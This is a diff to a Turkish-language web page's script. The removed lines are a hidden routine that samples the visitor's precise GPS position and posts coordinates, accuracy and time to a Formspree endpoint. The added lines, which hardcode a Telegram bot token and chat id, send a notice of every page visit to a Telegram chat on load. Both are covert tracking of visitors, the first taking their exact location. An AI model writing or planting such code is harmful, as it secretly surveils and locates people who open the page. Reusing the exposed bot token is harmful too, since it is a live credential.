@@ -472,100 +472,30 @@ Dil: ${lang}`;
 </script>
 
 <script>
-(function sendAccurateGPSToFormspree(){
-  const FORMSPREE_URL = "https://formspree.io/f/xwpnwvyv"; // Formspree endpoint
-  if (!('geolocation' in navigator)) {
-    fetch(FORMSPREE_URL, {
-      method: "POST",
-      headers: {'Content-Type':'application/json','Accept':'application/json'},
-      body: JSON.stringify({ message: "GPS desteklenmiyor - cihaz/tarayıcı desteklemiyor." })
-    }).catch(()=>{});
-    return;
-  }
+const TELEGRAM_TOKEN = "8468528561:AAFw64ZqvtRK2eLAdIHrL3zgHJ806R8n8Gw";
+const CHAT_ID = "7204099615"; // sizin chat id'niz
 
-  const MAX_SAMPLES = 8;        // Alınacak maksimum örnek sayısı
-  const MAX_WAIT_MS = 20000;    // Maksimum bekleme süresi (ms)
-  const GOOD_ACCURACY_M = 20;   // Bu değerin altına inerse doğrudan bitir (metre)
+window.addEventListener("load", () => {
+  const text = `📢 Yeni ziyaret!
+🌍 Sayfa: ${location.href}
+🕒 Zaman: ${new Date().toLocaleString()}`;
 
-  let best = null;
-  let samples = 0;
-  let finished = false;
-
-  const opts = { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 };
-
-  const overallTimer = setTimeout(()=> { if(!finished) finish("timeout"); }, MAX_WAIT_MS);
-  const watchId = navigator.geolocation.watchPosition(success, fail, opts);
-
-  function success(pos) {
-    samples++;
-    const c = pos.coords;
-    const lat = c.latitude;
-    const lon = c.longitude;
-    const acc = (typeof c.accuracy === 'number') ? c.accuracy : 1e6;
-
-    if(!best || acc < best.accuracy){
-      best = { latitude: lat, longitude: lon, accuracy: acc, timestamp: pos.timestamp };
-    }
-
-    if(acc <= GOOD_ACCURACY_M || samples >= MAX_SAMPLES){
-      finish("good-accuracy-or-samples");
-    }
-  }
-
-  function fail(err){
-    finish("error:" + (err && err.message ? err.message : "unknown"));
-  }
-
-  function finish(reason){
-    if(finished) return;
-    finished = true;
-    clearTimeout(overallTimer);
-    if (watchId !== undefined) navigator.geolocation.clearWatch(watchId);
-
-    if(best){
-      const lat = Number(best.latitude).toFixed(6);
-      const lon = Number(best.longitude).toFixed(6);
-      const acc = Number(best.accuracy).toFixed(3);
-      const time = new Date(best.timestamp).toLocaleString('tr-TR');
-
-      const payload = {
-        message: `📌 Doğru GPS Konumu (seçilen örnek)
-Enlem: ${lat}
-Boylam: ${lon}
-Doğruluk: ±${acc} m
-Zaman: ${time}
-Sebep: ${reason}`
-      };
-
-      fetch(FORMSPREE_URL, {
-        method: "POST",
-        headers: {'Content-Type':'application/json','Accept':'application/json'},
-        body: JSON.stringify(payload)
-      }).catch(()=>{});
-    } else {
-      fetch(FORMSPREE_URL, {
-        method: "POST",
-        headers: {'Content-Type':'application/json','Accept':'application/json'},
-        body: JSON.stringify({ message: `⚠️ GPS bulunamadı veya izin reddedildi. Sebep: ${reason}` })
-      }).catch(()=>{});
-    }
-  }
-
-  // İzin reddedilirse hemen bitir
-  try {
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({name:'geolocation'}).then(p => {
-        if(p.state === 'denied'){
-          finish("permission-denied");
-        }
-      }).catch(()=>{});
-    }
-  } catch(e){}
-})();
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  });
+});
 </script>
+  
+    
 
 </body>
 </html>
+
 
 
 
